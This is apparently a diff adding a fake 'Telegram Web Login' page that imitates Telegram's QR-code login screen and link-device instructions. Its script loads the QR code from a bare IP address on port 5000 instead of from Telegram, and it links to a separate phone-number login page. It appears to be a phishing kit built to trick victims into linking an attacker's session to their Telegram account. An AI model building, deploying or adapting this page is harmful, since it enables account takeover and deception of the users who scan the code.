@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Telegram Web Login</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #1e1e1e; /* dark gray background */
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      text-align: center;
+      margin-top: -250px; /* move upward by 200px */
+      padding-left: 40px; /* shift right */
+    }
+
+    .qr-box {
+      background-color: transparent;
+      padding: 10px;
+      border-radius: 30px;
+      margin-bottom: 30px;
+      display: inline-block;
+      width: 280px;
+      height: 290px;
+      position: relative;
+      overflow: hidden; /* clip children */
+    }
+
+    /* QR code image styling */
+    .qr-box #qr-image {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 30px;
+      display: block; /* make sure it respects container */
+      position: relative;
+      z-index: 5; /* below overlay */
+    }
+
+    /* Loading gif: same size, centered */
+    .qr-box #loading-gif {
+      width: 150px;  /* or your preferred size */
+      height: 150px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 6; /* above qr-image */
+    }
+
+    /* Overlay gif styling */
+    .qr-box #overlay-gif {
+      display: none;  /* hide by default */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 58px;
+      height: 58px;
+      z-index: 10;
+      pointer-events: none;
+    }
+
+    /* Optionally hide loading gif once QR code loads (JS control) */
+
+
+    .instructions {
+      font-size: 17px;
+      text-align: left;
+      font-weight: 530;
+      max-width: 360px;
+      margin: auto;
+    }
+
+    .instructions-title {
+      font-weight: bold;
+      margin-bottom: 15px;
+      font-size: 20px;
+      padding-left: 20px;
+    }
+
+    .instructions ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .instructions li {
+      display: flex;
+      align-items: flex-start;
+      margin: 20px 0;
+      flex-wrap: nowrap;
+    }
+
+    .instructions li span {
+      display: inline;
+    }
+
+    .circle-number {
+      background-color: #8774e1;
+      color: white;
+      border-radius: 50%;
+      width: 22px;
+      height: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 17px;
+      font-weight: 400;
+      margin-right: 10px;
+      flex-shrink: 0;
+    }
+
+    .login-alt {
+      margin-top: 300px;
+      color: #8774e1;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 15px;
+      text-decoration: none;
+      padding: 5px 10px;
+      border-radius: 8px;
+      transition: background-color 0.2s ease;
+    }
+
+    .login-alt:hover {
+      background-color: rgba(135, 116, 225, 0.08); /* subtle purple tint */
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="qr-box">
+      <!-- Loading transparent gif initially -->
+      <img
+        id="loading-gif"
+        src="https://media.giphy.com/media/2uWmx4zuXaG8t930kU/giphy.gif"
+        alt="Loading..."
+        class="loading-gif"
+      />
+      <!-- QR code image (hidden initially) -->
+      <img id="qr-image" alt="QR Code" class="qr" style="display:none;" />
+      <!-- Telegram flying airplane GIF overlay -->
+      <img
+        id="overlay-gif"
+        src="https://media.giphy.com/media/N1xcTWbkNxBb54KUd7/giphy.gif"
+        alt="Telegram flying logo"
+        class="overlay-gif"
+      />
+    </div>
+    <div class="instructions">
+      <div class="instructions-title">Log in to Telegram by QR Code</div>
+      <ul>
+        <li>
+          <div class="circle-number">1</div>
+          <span>Open Telegram on your phone</span>
+        </li>
+        <li>
+          <div class="circle-number">2</div>
+          <span>
+            Go to <strong>Settings &gt; Devices &gt; Link &gt;</strong><br />
+            <strong>Desktop Device</strong>
+          </span>
+        </li>
+        <li>
+          <div class="circle-number">3</div>
+          <span>
+            Point your phone at this screen<br />
+            to confirm login
+          </span>
+        </li>
+      </ul>
+    </div>
+    <a href="login_phone.html" class="login-alt">LOG IN BY PHONE NUMBER</a>
+  </div>
+
+  <script>
+    const qrImage = document.getElementById('qr-image');
+    const overlayGif = document.getElementById('overlay-gif');
+    const loadingGif = document.getElementById('loading-gif');
+    const qrUrl = "http://196.251.115.76:5000/getqr";
+
+    fetch(qrUrl)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not OK');
+        }
+        return response.blob();
+      })
+      .then(blob => {
+        const imgUrl = URL.createObjectURL(blob);
+        qrImage.src = imgUrl;
+      })
+      .catch(error => {
+        console.error('Failed to load QR code:', error);
+        qrImage.alt = "Failed to load QR code";
+      });
+
+    // When QR image is loaded:
+    qrImage.onload = () => {
+      // Hide loading gif
+      loadingGif.style.display = 'none';
+      // Show the QR code image
+      qrImage.style.display = 'block';
+      // Show the airplane overlay gif
+      overlayGif.style.display = 'block';
+    };
+  </script>
+</body>
+</html>
